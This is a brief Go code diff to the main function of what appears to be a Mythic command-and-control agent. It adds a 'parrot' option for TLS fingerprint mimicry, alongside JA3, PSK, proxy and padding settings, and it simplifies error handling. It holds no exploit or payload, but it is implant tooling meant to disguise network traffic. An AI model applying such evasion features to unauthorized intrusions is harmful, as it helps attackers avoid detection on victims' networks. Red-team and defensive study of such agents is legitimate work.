@@ -52,6 +52,7 @@ var verbose = "false"
 var debug = "false"
 var profile = ""
 var opaque []byte
+var parrot string
 
 func main() {
 	core.Verbose, _ = strconv.ParseBool(verbose)
@@ -64,13 +65,7 @@ func main() {
 		KillDate: killdate,
 		MaxRetry: maxretry,
 	}
-	a, err := agent.New(agentConfig)
-	if err != nil {
-		if core.Verbose {
-			color.Red(err.Error())
-		}
-		os.Exit(1)
-	}
+	a := agent.New(agentConfig)
 
 	switch profile {
 	case "http":
@@ -82,6 +77,7 @@ func main() {
 			PSK:       psk,
 			UserAgent: useragent,
 			JA3:       ja3,
+			Parrot:    parrot,
 			Host:      host,
 			Proxy:     proxy,
 			Padding:   padding,
@@ -98,6 +94,7 @@ func main() {
 			}
 		}
 		// Get the client
+		var err error
 		a.Client, err = mythic.New(clientConfig)
 		if err != nil {
 			if core.Verbose {
